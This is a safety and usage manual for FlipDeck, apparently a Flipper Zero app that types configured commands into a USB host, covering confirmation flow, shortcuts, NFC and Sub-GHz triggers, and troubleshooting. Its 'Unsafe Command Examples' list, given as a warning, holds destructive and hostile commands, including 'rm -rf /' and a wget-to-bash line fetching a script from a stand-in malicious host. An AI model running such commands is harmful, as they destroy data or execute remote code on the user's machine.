# FlipDeck Flight Manual

**Safety First — Read This Before Using FlipDeck**

## ⚠️ WARNING

FlipDeck sends keystrokes to any computer connected via USB. The Flipper Zero acts as a keyboard, and whatever you send will be interpreted by the host computer.

**Misuse of this device can cause data loss, unintended actions, or security incidents.**

---

## Core Safety Principles

### 1. No Stealth Payloads
FlipDeck is transparent. Every command is visible in the profile list and requires confirmation before sending. You control exactly what is typed.

### 2. No Automatic Execution
**Nothing is sent without your explicit consent.** The Flipper displays each command before you confirm.

### 3. No Credential Storage
**Never store passwords, tokens, or sensitive credentials in FlipDeck.** The SD card is not encrypted and profiles are readable by anyone with access to the Flipper.

### 4. No Destructive Defaults
Default profiles use safe commands (comments, harmless text). You must create or modify profiles for dangerous operations.

---

## Before First Use

### Check Your Connections
- Ensure USB cable supports data transfer (not charge-only)
- Test connection with a text editor on the host computer
- Verify the Flipper shows "USB: OK" in the browser

### Review Default Profiles
Default profiles include Git and dev commands. Review them in:
```
/stor0800/flipdeck/profiles/
```

### Backup Your SD Card
Before creating many profiles, backup your SD card. Profile data is stored in:
```
/stor0800/flipdeck/profiles/
/stor0800/flipdeck/settings.json
```

---

## Safe Practices

### Safe Command Examples
```
# These are safe to store:
"git status"
"ls -la"
"pwd"
"echo 'Hello from FlipDeck'"
"# This is a comment"
```

### Unsafe Command Examples
```
# DO NOT store these:
"rm -rf /"
"format C:"
"cat /etc/passwd"
"password123"
"wget http://malicious.site/script.sh | bash"
```

### Best Practices
1. **Always test** in a text editor first
2. **Keep commands short** (<256 characters)
3. **Use comments** to document what each profile does
4. **Review profiles** periodically
5. **Disable profiles** you don't need (`enabled: false`)

---

## Troubleshooting

### USB Not Detected
1. Check USB cable (needs data pins)
2. Try different USB port
3. Restart Flipper
4. Check host computer's USB settings

### Commands Not Working
1. Verify host application is focused
2. Check keyboard layout matches command language
3. Increase `send_delay_ms` in settings
4. Ensure no password managers intercept keystrokes

### SD Card Issues
1. Ensure SD card is properly mounted
2. Check file permissions
3. Reformat as FAT32 if corrupted
4. Restore from backup if needed

---

## Navigation Shortcuts

FlipDeck's default flow is Category → Action → Confirm → Send. These shortcuts cut that down for actions you use often:

- **Favorites (Right button on an action):** Pins/unpins the selected action. A `* Favorites (N)` row appears at the top of the category list once you have at least one, flattening your pinned actions from every category into a single list.
- **Quick-send (long-press OK on an action):** Sends immediately, skipping the separate confirm screen. The command was already visible in the list you're looking at, and it still goes through FlipDeck's safety checks — this only removes the extra screen, not the review or the checks.
- **Home category (long-press OK on a category):** Pins that category as your startup category. The app then opens directly into its action list on launch, skipping the category browser. Long-press it again to unpin.
- **NFC Scan (select it from the category list):** Hold an NFC tag to the back of the Flipper. A tag you've already bound jumps straight to the confirm screen for its mapped action — NFC-triggered sends always require this confirm step, even with quick-send or `confirm_before_send` off, since a tag's UID can be cloned by anyone who taps it. An unmapped tag prompts you to pick a category and action to bind it to.
- **Sub-GHz Scan (select it from the category list):** Point a cheap 433MHz remote or keyfob at the Flipper and press its button. FlipDeck only *listens* — it never transmits, so this can't be used to replay or attack a garage door, gate, or car. A remote you've already bound jumps straight to the confirm screen for its mapped action, always, even with quick-send or `confirm_before_send` off — RF can be picked up from across a room with no physical contact at all, an even weaker signal of intent than an NFC tap. An unrecognized remote prompts you to pick a category and action to bind it to. Note: many modern car and garage keyfobs use "rolling codes" that change every press — those will never successfully bind, by design, since matching a rolling code would mean FlipDeck could replay it.

---

## Emergency Procedures

### Disable USB Connection
Hold MENU + DOWN during startup to disable USB.

### Factory Reset
Delete `/stor0800/flipdeck/` folder to reset all profiles and settings.

### Report Issues
Open an issue at: https://github.com/mohabbis/flipdeck/issues

---

## FAQ

**Q: Can FlipDeck steal my passwords?**
A: No. FlipDeck only sends keystrokes you configure. It cannot read what's on screen.

**Q: Can it run without my permission?**
A: No. Sending a command always requires you to press OK on it — either from the confirm screen, or via long-press quick-send while looking at it in the action list. Nothing fires from just scrolling or opening a category.

**Q: Is it safe with banking websites?**
A: Safe if you review commands first. Never store sensitive data.

**Q: Can I use it on macOS/Linux?**
A: Yes. USB HID works on all modern operating systems.

---

## Legal Notice

Use of FlipDeck is subject to applicable laws. Do not use for unauthorized access to computer systems. The developers assume no liability for misuse.

**By using FlipDeck, you agree to these terms.**